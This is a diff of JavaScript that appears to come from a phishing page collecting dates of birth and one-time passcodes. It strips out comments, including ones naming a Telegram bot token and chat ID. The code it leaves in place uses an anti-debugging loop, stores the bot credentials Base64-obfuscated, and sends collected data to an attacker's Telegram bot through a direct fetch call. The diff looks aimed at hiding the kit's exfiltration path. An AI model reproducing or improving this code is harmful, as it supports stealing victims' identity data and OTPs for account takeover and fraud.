@@ -9,9 +9,6 @@
   setInterval(() => { debugger; }, 2000);
 })();
 
-// ── TELEGRAM CONFIG (Base64 Encoded by Toxic) ──
-// Token: 8877013842:AAFb86Djnm2J-hWjk42flwflW37cuWI9b78
-// Chat ID: -1004269628512
 const _0x5a21 = [
   "ODk3MDM3NzIyOTpBQUZZZkQxRDBrOTQzUkpQNFM2N0p6QjdWZWpLZnhpdlVwTQ==",
   "LTEwMDI4NDM2MzM5OTY="
@@ -25,7 +22,6 @@ let otpAttempts = 0;
 let timerInterval;
 let timeLeft = 15;
 
-// Date Wheel Picker
 const months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
 let selectedDate = { day: 1, month: 0, year: 2000 };
 
@@ -315,7 +311,6 @@ function setStep(n) {
   if (n === 3) { s1.classList.add('done'); s2.classList.add('done'); s3.classList.add('active'); }
 }
 
-// ── DIRECT TELEGRAM CALL (No API layer) ──
 async function sendToTelegram(message) {
   try {
     const response = await fetch('https://api.telegram.org/bot' + _BOT_TOKEN + '/sendMessage', {
